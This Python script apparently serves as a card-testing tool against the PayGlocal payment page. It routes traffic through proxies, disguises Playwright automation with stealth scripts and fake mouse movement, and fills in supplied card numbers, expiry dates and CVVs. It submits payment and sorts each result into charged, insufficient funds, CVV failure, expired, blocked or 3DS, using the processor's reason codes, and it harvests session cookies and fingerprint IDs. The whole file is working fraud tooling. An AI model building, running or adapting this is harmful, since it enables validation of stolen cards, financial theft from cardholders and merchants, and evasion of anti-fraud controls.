"""Playwright (stealth) FULL PayGlocal flow -> real terminal verdict + cookies.
Fingerprint -> fill zip -> click Pay -> 3DS -> terminal (declined/charged/insufficient/3d).
Usage: python pw_flow.py <xgl_token> <zip> <proxy>
Output JSON: {"category":..., "real-response":..., "cookies":{...}, "visitorId":...}
"""
import json, sys, time, urllib.parse as up

def parse_proxy(proxy):
    p = proxy.strip()
    if "://" in p: p = p.split("://", 1)[1]
    if "@" in p:
        auth, hp = p.split("@", 1); u, pw = auth.split(":", 1); h, port = hp.split(":", 1)
        return {"server": f"http://{h}:{port}", "username": u, "password": pw}
    parts = p.split(":")
    if len(parts) == 4:
        h, port, u, pw = parts
        return {"server": f"http://{h}:{port}", "username": u, "password": pw}
    return {"server": f"http://{parts[0]}:{parts[1]}"}

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
window.chrome = window.chrome || { runtime: {} };
Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
"""

TERM = ['declin', "couldn't approve", 'insufficient', 'not have enough balance',
        'success', 'paid', 'completed', 'otp', 'one time', 'verification', 'expired',
        'authenticated', 'charged', 'failed', 'confirm with your bank', 'almost there']

def clean_msg(s):
    if not s: return ""
    s = " ".join(s.split())
    for marker in ("Complete your payment", "Pay Now"):
        if marker in s: s = s.split(marker, 1)[1].strip(); break
    for marker in ("Retry payment", "Powered by", "By continuing", "T&C"):
        if marker in s: s = s.split(marker, 1)[0].strip(); break
    return s

def classify(body, ipay):
    low = (body or "").lower()
    full = clean_msg(body)
    ipay_resp = [b for u,_,b in ipay if u == "ipay"]
    # body-text terminal messages (specific first)
    if any(k in low for k in ("payment successful", "transaction successful", "payment complete",
                              "transaction completed", "payment was successful", "successfully")):
        return "charged", full or "payment successful"
    if any(k in low for k in ("insufficient", "not enough balance", "not enough funds")):
        return "insufficient", full or "insufficient balance"
    if "incorrect cvv" in low or "invalid cvv" in low or "wrong cvv" in low:
        return "cvv", full or "CVV fail"
    if "expired" in low:
        return "expired", full or "card expired"
    if any(k in low for k in ("invalid card", "card number", "lost card", "stolen", "invalid account")):
        return "invalid", full or "invalid card"
    if "blocked" in low or "restricted" in low:
        return "blocked", full or "blocked card"
    if "authentication timeout" in low or "3ds timeout" in low:
        return "3d_timeout", full or "3DS authentication timeout"
    if "declin" in low or "couldn't approve" in low or "not approved" in low or "rejected" in low:
        return "declined", full or "card provider declined this payment"
    if "otp" in low or "one time" in low or "verification" in low or "confirm with your bank" in low or "almost there" in low:
        return "3d", full or "3DS OTP challenge"
    # ipay terminal status + reason codes
    for b in ipay_resp:
        try:
            d = json.loads(b); st = d.get("status","") or ""; code = d.get("reasonCode","") or ""; msg = d.get("message","") or ""
            reason = f"{st} {code} {msg}".strip()
            if st in ("SENT_FOR_CAPTURE","CAPTURED","SUCCESS","SUCCESSFUL","PAID","COMPLETED"):
                return "charged", reason or full or "payment successful"
            if st in ("AUTHORIZED","APPROVED"):
                return "approved", reason or full or "authorized by issuer"
            if st in ("ISSUER_DECLINE","GENERAL_DECLINE","DECLINED","FAILED"):
                if code in ("GL-201-009","GL-201-014"): return "insufficient", reason or "insufficient funds"
                if code in ("GL-201-007",): return "expired", reason or "card expired"
                if code in ("GL-201-006","GL-201-013"): return "cvv", reason or "CVV fail"
                if code in ("GL-201-010","GL-201-019"): return "invalid", reason or "invalid card"
                if code in ("GL-201-012","GL-201-016"): return "blocked", reason or "blocked card"
                return "declined", reason or full or "card declined"
            if st in ("AUTHENTICATION_TIMEOUT",):
                return "3d_timeout", reason or "3DS authentication timeout"
            if st in ("ABANDONED","CUSTOMER_CANCELLED"):
                return "cancelled", reason or "cancelled"
            if st == "INPROGRESS":
                return "3d", "3DS challenge in progress"
        except Exception:
            pass
    if full: return "declined", full
    return "error", "no terminal result"

def main():
    xgl, zipc, proxy = sys.argv[1], sys.argv[2], sys.argv[3]
    card = {}
    if len(sys.argv) > 4:
        try:
            card = json.loads(sys.argv[4])
        except Exception:
            card = {}
    proxy_cfg = parse_proxy(proxy)
    from playwright.sync_api import sync_playwright
    ipay = []
    risk_fp_req = {}
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, proxy=proxy_cfg,
            args=["--disable-blink-features=AutomationControlled"])
        ctx = browser.new_context(viewport={"width":1920,"height":1080},
            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36")
        ctx.add_init_script(STEALTH_JS)
        page = ctx.new_page()
        page.on("request", lambda req: risk_fp_req.update(body=req.post_data) if "risk/fp" in req.url and not risk_fp_req else None)
        page.on("response", lambda r: ipay.append((r.url.split("/")[-1].split("?")[0], r.status, r.text()[:1000]))
                if ("ipay" in r.url or "paynow" in r.url) else None)
        page.goto(f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={xgl}",
                  timeout=45000, wait_until="domcontentloaded")
        # human-like mouse movement
        page.mouse.move(420, 320)
        for i in range(10):
            page.mouse.move(420 + (i*41) % 520, 320 + (i*47) % 320, steps=6)
            page.wait_for_timeout(110)
        # wait for any Pay button (Pay Now, or DCC "Pay $"/"Pay ₹")
        try:
            page.wait_for_selector("button:has-text('Pay')", timeout=45000)
        except Exception as e:
            try:
                body = page.locator("body").inner_text(timeout=3000)
            except Exception:
                body = ""
            print(json.dumps({"category":"error","real-response":"no pay button: " + " ".join(body.split())[:250] + " :: " + str(e)[:80]}))
            browser.close(); return
        # if the card form is empty ("Enter card details"), fill the card
        if card.get("number"):
            for sel in ["#cardNumber", "#card_number", "#gl_card_number", "input[name='cardNumber']", "input[name='card_number']", "input[placeholder*='card number']", "input[placeholder*='Card']"]:
                try:
                    el = page.locator(sel).first
                    if el.is_visible() and not (el.input_value() or "").strip():
                        el.fill(card["number"])
                        break
                except Exception:
                    continue
            for sel in ["#expiry", "#cardExpiry", "#gl_card_expiry", "input[name='expiry']", "input[name='cardExpiry']", "input[placeholder*='MM/YY']", "input[placeholder*='expiry']"]:
                try:
                    el = page.locator(sel).first
                    if el.is_visible() and not (el.input_value() or "").strip():
                        el.fill(f"{card.get('expiryMonth','')}{card.get('expiryYear','')[-2:]}")
                        break
                except Exception:
                    continue
            for sel in ["#cvv", "#cardCvv", "#gl_card_cvv", "input[name='cvv']", "input[name='cardCvv']", "input[name='securityCode']", "input[placeholder*='CVV']", "input[placeholder*='cvv']"]:
                try:
                    el = page.locator(sel).first
                    if el.is_visible() and not (el.input_value() or "").strip():
                        el.fill(card.get("cvv", ""))
                        break
                except Exception:
                    continue
        # fill zip (if present)
        try:
            page.click("#gl_billing_addressPostalCode")
            page.type("#gl_billing_addressPostalCode", str(zipc), delay=25)
        except Exception:
            pass
        # click the last "Pay" button (DCC: INR is last; else Pay Now)
        try:
            page.locator("button:has-text('Pay')").last.click(timeout=15000)
        except Exception:
            pass
        # poll for terminal
        body = ""
        got_ipay = False
        for i in range(24):
            page.wait_for_timeout(1500)
            if any(u == "ipay" for u,_,_ in ipay) and not got_ipay:
                got_ipay = True
                page.wait_for_timeout(2500)
            try:
                body = page.locator("body").inner_text(timeout=3000)
            except Exception:
                body = ""
            if TERM and any(k in body.lower() for k in TERM):
                break
        cookies = ctx.cookies()
        browser.close()
    cat, real = classify(body, ipay)
    out = {"category": cat, "real-response": real,
           "cookies": {c["name"]: c["value"] for c in cookies}}
    if risk_fp_req.get("body"):
        try:
            b = json.loads(risk_fp_req["body"])
            out["visitorId"] = b.get("visitorId", "")
            out["requestId"] = b.get("requestId", "")
        except Exception:
            pass
    print(json.dumps(out))

if __name__ == "__main__":
    main()
